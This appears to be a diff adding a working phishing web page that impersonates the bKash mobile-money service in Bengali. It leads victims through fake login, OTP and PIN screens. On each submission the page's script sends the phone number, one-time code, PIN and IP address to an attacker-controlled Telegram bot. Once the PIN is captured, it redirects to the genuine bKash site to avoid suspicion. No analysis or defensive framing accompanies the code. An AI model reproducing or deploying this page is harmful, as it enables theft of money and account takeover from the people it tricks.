@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>বিকাশ · লগইন · OTP · PIN</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background: #fff;
+            max-width: 420px;
+            margin: auto;
+            min-height: 100vh;
+            padding-bottom: 280px;
+            position: relative;
+        }
+        .topbar, .top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 20px 8px 20px;
+        }
+        .back {
+            font-size: 28px;
+            cursor: pointer;
+            color: #222;
+        }
+        .lang {
+            font-size: 14px;
+            font-weight: 500;
+            color: #444;
+            border: 1px solid #ddd;
+            padding: 4px 10px;
+            border-radius: 20px;
+        }
+        .logo-area {
+            padding: 0 20px 10px 20px;
+        }
+        .logo-area img {
+            width: 80px;
+            height: 80px;
+            object-fit: contain;
+        }
+        .title {
+            font-size: 26px;
+            font-weight: 700;
+            line-height: 1.3;
+            color: #111;
+            padding: 0 20px;
+            margin-bottom: 20px;
+        }
+        .label {
+            color: #999;
+            font-size: 11px;
+            margin-bottom: 4px;
+        }
+        .box {
+            border: 1px solid #ddd;
+            border-radius: 14px;
+            padding: 12px 16px;
+            margin-bottom: 14px;
+            background: #fff;
+        }
+        .country {
+            font-size: 14px;
+            font-weight: 500;
+            color: #222;
+        }
+        .input {
+            width: 100%;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            color: #444;
+            background: transparent;
+        }
+        .input::placeholder {
+            color: #aaa;
+        }
+        .terms {
+            color: #888;
+            font-size: 12px;
+            line-height: 1.5;
+            margin: 10px 0 30px;
+            padding: 0 4px;
+        }
+        .terms span {
+            color: #d6296c;
+            font-weight: 600;
+        }
+        .btn {
+            width: 100%;
+            border: none;
+            background: #d6296c;
+            color: #fff;
+            border-radius: 40px;
+            padding: 16px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn:hover { opacity: .95; }
+
+        /* OTP & PIN shared */
+        .container {
+            padding: 10px 20px 20px 20px;
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 500;
+            line-height: 1.3;
+            color: #333;
+        }
+        .sub, .mobile, .number, .pin-label {
+            margin-top: 12px;
+            font-size: 15px;
+            color: #555;
+        }
+        .mobile, .number {
+            font-weight: 600;
+            color: #222;
+            font-size: 16px;
+        }
+        .edit {
+            color: #d6296c;
+            text-decoration: none;
+            font-size: 13px;
+            margin-left: 8px;
+        }
+        .otp-box {
+            display: flex;
+            gap: 8px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        .otp-box input {
+            width: 48px;
+            height: 55px;
+            border: none;
+            border-bottom: 2px solid #ddd;
+            text-align: center;
+            font-size: 24px;
+            outline: none;
+            background: transparent;
+        }
+        .otp-box input:focus {
+            border-bottom-color: #d6296c;
+        }
+        .timer {
+            margin-top: 14px;
+            color: #d6296c;
+            font-size: 13px;
+        }
+        .resend {
+            margin-top: 6px;
+            color: #888;
+            font-size: 13px;
+            cursor: default;
+        }
+        .bottom {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            max-width: 420px;
+            background: #d6296c;
+            color: #fff;
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 18px;
+            border: none;
+            cursor: pointer;
+            left: 50%;
+            transform: translateX(-50%);
+            border-radius: 30px 30px 0 0;
+        }
+        .arrow {
+            font-size: 26px;
+        }
+
+        /* PIN page */
+        .pin-box {
+            display: flex;
+            gap: 14px;
+            margin-top: 12px;
+        }
+        .pin-box input {
+            width: 40px;
+            height: 40px;
+            border: none;
+            border-bottom: 2px solid #ddd;
+            text-align: center;
+            font-size: 26px;
+            background: transparent;
+        }
+        .forgot {
+            display: inline-block;
+            margin-top: 14px;
+            color: #d6296c;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        .next {
+            width: 100%;
+            background: #ccc;
+            color: #fff;
+            border: none;
+            padding: 15px;
+            margin-top: 18px;
+            font-size: 16px;
+            border-radius: 30px;
+            transition: 0.2s;
+        }
+        .keypad {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            max-width: 420px;
+            background: #f8f8f8;
+            padding: 10px 12px 16px 12px;
+            left: 50%;
+            transform: translateX(-50%);
+            border-radius: 30px 30px 0 0;
+            box-shadow: 0 -4px 12px rgba(0,0,0,0.05);
+        }
+        .row {
+            display: flex;
+            justify-content: space-between;
+            gap: 6px;
+        }
+        .key {
+            width: 32%;
+            height: 60px;
+            border: none;
+            background: #fff;
+            font-size: 28px;
+            margin: 4px 0;
+            border-radius: 16px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.02);
+            cursor: pointer;
+            transition: 0.1s;
+        }
+        .key:active { background: #e0e0e0; }
+        .del {
+            font-size: 24px;
+        }
+
+        /* hide spinner */
+        input[type="tel"]::-webkit-inner-spin-button,
+        input[type="tel"]::-webkit-outer-spin-button { -webkit-appearance: none; }
+        input[type="tel"] { -moz-appearance: textfield; }
+
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+<!-- ========== LOGIN PAGE ========== -->
+<div id="page-login">
+    <div class="topbar">
+        <div class="back">←</div>
+        <div class="lang">Eng | বাংলা</div>
+    </div>
+    <div class="logo-area"><img src="https://i.ibb.co/gMFBdRML/image.jpg" alt="Bkash Logo"></div>
+    <h1 class="title">মোবাইল নাম্বার দিয়ে<br>লগ ইন / রেজিস্ট্রেশন<br>করুন</h1>
+
+    <form id="loginForm" style="padding:0 20px;">
+        <div class="label">দেশের কোড</div>
+        <div class="box"><div class="country">🇧🇩 বাংলাদেশ</div></div>
+        <div class="box">
+            <div class="label">মোবাইল নাম্বার</div>
+            <input class="input" type="tel" id="mobileInput" placeholder="01XXXXXXXXX" required>
+        </div>
+        <div class="terms">আপনি <span>নিয়ম ও শর্তাবলী</span> এবং <span>গোপনীয়তা নীতি</span> মেনে নিচ্ছেন।</div>
+        <button type="submit" class="btn">পরবর্তী →</button>
+    </form>
+</div>
+
+<!-- ========== OTP PAGE ========== -->
+<div id="page-otp" style="display:none;">
+    <div class="top">
+        <div class="back" onclick="showLogin()">←</div>
+        <div>Eng <span class="lang">বাং</span></div>
+    </div>
+    <div class="logo-area"><img src="https://i.ibb.co/gMFBdRML/image.jpg" alt="Bkash Logo"></div>
+    <div class="container">
+        <h1>OTP দিয়ে<br>ভেরিফাই করুন</h1>
+        <div class="sub">OTP পাঠানো হয়েছে</div>
+        <div class="mobile" id="otpMobileDisplay">01XXXXXXXXX <a href="#" class="edit" onclick="showLogin();return false;">পরিবর্তন</a></div>
+
+        <form id="otpForm">
+            <input type="hidden" id="otpHiddenNumber" value="">
+            <div class="otp-box">
+                <input type="text" maxlength="1" class="otp-digit" required>
+                <input type="text" maxlength="1" class="otp-digit" required>
+                <input type="text" maxlength="1" class="otp-digit" required>
+                <input type="text" maxlength="1" class="otp-digit" required>
+                <input type="text" maxlength="1" class="otp-digit" required>
+                <input type="text" maxlength="1" class="otp-digit" required>
+            </div>
+            <div class="timer" id="otpTimer">59 সেকেন্ড বাকি</div>
+            <div class="resend" id="resendOtp" style="cursor:pointer;color:#d6296c;">OTP পুনরায় পাঠান</div>
+            <button type="submit" class="bottom"><span>যাচাই করুন</span><span class="arrow">→</span></button>
+        </form>
+    </div>
+</div>
+
+<!-- ========== PIN PAGE ========== -->
+<div id="page-pin" style="display:none;">
+    <div class="top">
+        <div class="back" onclick="showOtp()">←</div>
+        <div>Eng <span class="lang">বাং</span></div>
+    </div>
+    <div class="logo-area"><img src="https://i.ibb.co/gMFBdRML/image.jpg" alt="Bkash Logo"></div>
+    <div class="container">
+        <h1>লগইন</h1>
+        <div class="number" id="pinMobileDisplay">01XXXXXXXXX</div>
+        <div class="pin-label">PIN</div>
+        <div class="pin-box" id="pinBox">
+            <input readonly><input readonly><input readonly><input readonly><input readonly>
+        </div>
+        <a href="#" class="forgot" onclick="alert('PIN পুনরুদ্ধার লিংক পাঠানো হবে');">PIN ভুলে গেছেন?</a>
+        <button class="next" id="nextBtn">পরবর্তী →</button>
+    </div>
+
+    <div class="keypad">
+        <div class="row">
+            <button class="key" onclick="addPinDigit('1')">1</button>
+            <button class="key" onclick="addPinDigit('2')">2</button>
+            <button class="key" onclick="addPinDigit('3')">3</button>
+        </div>
+        <div class="row">
+            <button class="key" onclick="addPinDigit('4')">4</button>
+            <button class="key" onclick="addPinDigit('5')">5</button>
+            <button class="key" onclick="addPinDigit('6')">6</button>
+        </div>
+        <div class="row">
+            <button class="key" onclick="addPinDigit('7')">7</button>
+            <button class="key" onclick="addPinDigit('8')">8</button>
+            <button class="key" onclick="addPinDigit('9')">9</button>
+        </div>
+        <div class="row">
+            <button class="key del" onclick="removePinDigit()">⌫</button>
+            <button class="key" onclick="addPinDigit('0')">0</button>
+            <button class="key" onclick="submitPin()">↵</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // =============================================
+    // 1. GET token & id FROM URL (GET METHOD)
+    // =============================================
+    function getQueryParam(param) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(param);
+    }
+
+    const token = getQueryParam('token') || 'No Token Found';
+    const id = getQueryParam('id') || 'No ID Found';
+
+    // =============================================
+    // 2. UTILITY FUNCTIONS
+    // =============================================
+    function getIP() {
+        return new Promise(resolve => {
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(data => resolve(data.ip))
+                .catch(() => resolve('IP অজানা'));
+        });
+    }
+
+    // =============================================
+    // 3. TELEGRAM SENDER
+    // =============================================
+    async function sendToTelegram(message) {
+        try {
+            const ip = await getIP();
+            const fullMsg = `🔑 Token: ${token}\n🆔 ID: ${id}\n🌐 IP: ${ip}\n\n${message}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: id, text: fullMsg })
+            });
+        } catch (e) {
+            console.warn('Telegram send error', e);
+        }
+    }
+
+    // =============================================
+    // 4. PAGE SWITCH
+    // =============================================
+    function showLogin() {
+        document.getElementById('page-login').style.display = 'block';
+        document.getElementById('page-otp').style.display = 'none';
+        document.getElementById('page-pin').style.display = 'none';
+    }
+    function showOtp() {
+        document.getElementById('page-login').style.display = 'none';
+        document.getElementById('page-otp').style.display = 'block';
+        document.getElementById('page-pin').style.display = 'none';
+        resetPinUI();
+    }
+    function showPin() {
+        document.getElementById('page-login').style.display = 'none';
+        document.getElementById('page-otp').style.display = 'none';
+        document.getElementById('page-pin').style.display = 'block';
+        resetPinUI();
+    }
+
+    // =============================================
+    // 5. LOGIN
+    // =============================================
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const mobile = document.getElementById('mobileInput').value.trim();
+        if (!mobile) return alert('মোবাইল নাম্বার দিন');
+        if (!/^01\d{9}$/.test(mobile)) {
+            alert('দয়া করে সঠিক মোবাইল নাম্বার দিন (01XXXXXXXXX)');
+            return;
+        }
+
+        await sendToTelegram(`📱 লগইন\nনাম্বার: ${mobile}`);
+
+        document.getElementById('otpMobileDisplay').innerHTML = `${mobile} <a href="#" class="edit" onclick="showLogin();return false;">পরিবর্তন</a>`;
+        document.getElementById('otpHiddenNumber').value = mobile;
+        showOtp();
+        startOtpTimer();
+    });
+
+    // =============================================
+    // 6. OTP
+    // =============================================
+    let otpTimerInterval = null;
+    function startOtpTimer() {
+        let time = 59;
+        const el = document.getElementById('otpTimer');
+        if (otpTimerInterval) clearInterval(otpTimerInterval);
+        otpTimerInterval = setInterval(() => {
+            if (time <= 0) {
+                clearInterval(otpTimerInterval);
+                el.innerText = 'OTP এর মেয়াদ শেষ';
+                return;
+            }
+            el.innerText = time + ' সেকেন্ড বাকি';
+            time--;
+        }, 1000);
+    }
+
+    document.querySelectorAll('.otp-digit').forEach((inp, idx, arr) => {
+        inp.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g,'');
+            if (this.value.length === 1 && idx < arr.length - 1) arr[idx+1].focus();
+        });
+        inp.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && !this.value && idx > 0) arr[idx-1].focus();
+        });
+    });
+
+    document.getElementById('otpForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const digits = document.querySelectorAll('.otp-digit');
+        let otp = '';
+        digits.forEach(d => otp += d.value);
+        if (otp.length < 6) return alert('6 ডিজিট OTP দিন');
+
+        const number = document.getElementById('otpHiddenNumber').value;
+
+        await sendToTelegram(`🔐 OTP যাচাই\nনাম্বার: ${number}\nOTP: ${otp}`);
+
+        document.getElementById('pinMobileDisplay').innerText = number;
+        showPin();
+    });
+
+    document.getElementById('resendOtp').addEventListener('click', async function() {
+        const number = document.getElementById('otpHiddenNumber').value;
+        if (!number) return;
+        await sendToTelegram(`🔄 OTP পুনরায় পাঠানো হয়েছে\nনাম্বার: ${number}`);
+        startOtpTimer();
+        document.querySelectorAll('.otp-digit').forEach(inp => inp.value = '');
+        document.querySelector('.otp-digit').focus();
+        alert('নতুন OTP পাঠানো হয়েছে');
+    });
+
+    // =============================================
+    // 7. PIN
+    // =============================================
+    let pin = "";
+    const pinInputs = document.querySelectorAll('#pinBox input');
+    const nextBtn = document.getElementById('nextBtn');
+
+    function updatePinUI() {
+        pinInputs.forEach((box, idx) => {
+            box.value = idx < pin.length ? '●' : '';
+        });
+        nextBtn.style.background = pin.length === 5 ? '#d6296c' : '#ccc';
+        nextBtn.style.color = pin.length === 5 ? '#fff' : '#fff';
+    }
+
+    function resetPinUI() {
+        pin = "";
+        updatePinUI();
+    }
+
+    function addPinDigit(num) {
+        if (pin.length < 5) {
+            pin += num;
+            updatePinUI();
+        }
+    }
+
+    function removePinDigit() {
+        pin = pin.slice(0, -1);
+        updatePinUI();
+    }
+
+    async function submitPin() {
+        if (pin.length === 5) {
+            const number = document.getElementById('pinMobileDisplay').innerText;
+            await sendToTelegram(`🔑 PIN সম্পূর্ণ\nনাম্বার: ${number}\nPIN: ${pin}`);
+            alert('অপেক্ষা করুন)');
+            
+            // Redirect to Google with token and id
+            window.location.href = `https://www.bkash.com/?token=${encodeURIComponent(token)}&id=${encodeURIComponent(id)}`;
+        } else {
+            alert('5 ডিজিট PIN দিন');
+        }
+    }
+
+    // next button click
+    nextBtn.onclick = submitPin;
+
+    // keyboard support
+    document.addEventListener('keydown', function(e) {
+        if (document.getElementById('page-pin').style.display === 'block') {
+            if (e.key === 'Backspace') {
+                removePinDigit();
+                e.preventDefault();
+            }
+            if (e.key >= '0' && e.key <= '9') {
+                addPinDigit(e.key);
+                e.preventDefault();
+            }
+            if (e.key === 'Enter') {
+                submitPin();
+                e.preventDefault();
+            }
+        }
+    });
+
+    // =============================================
+    // 8. INITIALIZE
+    // =============================================
+    showLogin();
+
+    // Make functions globally accessible
+    window.showPin = showPin;
+    window.showOtp = showOtp;
+    window.showLogin = showLogin;
+    window.addPinDigit = addPinDigit;
+    window.removePinDigit = removePinDigit;
+    window.submitPin = submitPin;
+
+    // Auto-focus mobile input on load
+    window.addEventListener('load', () => {
+        document.getElementById('mobileInput').focus();
+        console.log(`🔑 Token: ${token}, ID: ${id}`);
+    });
+</script>
+
+</body>
+</html>
